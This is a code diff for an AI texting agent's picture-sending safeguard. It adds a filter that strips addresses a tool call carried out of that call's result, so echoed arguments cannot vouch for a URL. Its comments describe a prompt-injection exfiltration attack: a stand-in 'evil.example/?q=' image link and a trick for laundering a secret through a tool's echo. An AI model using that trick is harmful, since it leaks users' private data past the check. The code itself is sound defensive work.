@@ -27,6 +27,15 @@
  *    picture at evil.example/?q=<their address>" is the attack. An address
  *    copied from what was read was written before the turn began, and holds
  *    nothing the turn learned.
+ *
+ * The second rule reads what the turn has seen, and a tool result is part of
+ * that — including the part where a tool restates what it was handed ("there
+ * is no https://… to work from"). That echo is the model's own words coming
+ * back, so a model told by an injected note to exfiltrate could write the
+ * secret into an argument, read it back, and have it vouched. Addresses the
+ * call itself carried are therefore cut out of what the result adds here
+ * (`withoutGiven`): one genuinely read earlier is already in `seenText` from
+ * when it was read, so nothing legitimate is lost.
  */
 
 /** The most pictures one answer sends: a few photos, not an album. */
@@ -39,6 +48,10 @@ const MAX_SEEN_TEXT = 400_000;
 const MAX_URL_LENGTH = 2000;
 
 const PICTURE_LINE = /^[ \t]*\[picture[ \t]+([^\]\s]+)[ \t]*\][ \t]*$/gim;
+/** Any https address, wherever it sits in a block of text or in a tool's arguments. */
+const ADDRESS = /https:\/\/[^\s"'()<>\\]+/gi;
+/** The most addresses one call's arguments are checked against: an argument may be a whole page. */
+const MAX_GIVEN = 40;
 const SENDABLE_TYPES = new Set(["image/jpeg", "image/png", "image/gif", "image/webp", "image/heic", "image/heif"]);
 
 /** What the model is told on a texted turn, so it never says it can't. */
@@ -47,6 +60,29 @@ export const PICTURES_LINE =
   "(open a note's picture with fetch and image first), or [picture <https address>] for a web image whose address " +
   "you read in a tool result. It goes as a photo after your words. To make one, send draw_picture draws a graphic " +
   "(a poster, an invite, a chart) from a page you write, and send make_picture makes or edits a photo (them in an outfit, a scene).";
+
+/**
+ * One tool result's words, with every address this same call carried in cut
+ * out, so a tool that repeats its arguments cannot vouch for them. An echo
+ * clipped short of what was given goes too — a refusal often prints the
+ * first few dozen characters, and those are enough to carry a phone number.
+ * An address that merely *starts* with one given stays: a page fetched at
+ * `.../a` naming `.../a/photo.png` wrote that itself, and the turn read it.
+ */
+function withoutGiven(said, name, args) {
+  let given;
+  try {
+    given = JSON.stringify([name, args ?? null]).match(ADDRESS) ?? [];
+  } catch {
+    return ""; // Arguments that will not serialize are not arguments we can clear this text of.
+  }
+  if (given.length === 0) return said;
+  const supplied = [...new Set(given.map((address) => address.toLowerCase()))].slice(0, MAX_GIVEN);
+  return said.replace(ADDRESS, (address) => {
+    const found = address.toLowerCase();
+    return supplied.some((one) => one.startsWith(found)) ? " " : address;
+  });
+}
 
 function webAddress(value) {
   if (value.length > MAX_URL_LENGTH) return null;
@@ -78,7 +114,7 @@ export function outgoingPictures({ enabled, question = "" }) {
       const numbers = [];
       for (const block of content) {
         if (block?.type === "text" && typeof block.text === "string" && text.length < MAX_SEEN_TEXT) {
-          text += `\n${block.text.slice(0, MAX_SEEN_TEXT - text.length)}`;
+          text += `\n${withoutGiven(block.text, name, args).slice(0, MAX_SEEN_TEXT - text.length)}`;
         }
         if (block?.type === "image" && typeof block.data === "string" && SENDABLE_TYPES.has(block.mimeType)) {
           seen.push({ name: `picture-${seen.length + 1}.${block.mimeType.split("/")[1]}`, mediaType: block.mimeType, data: block.data });
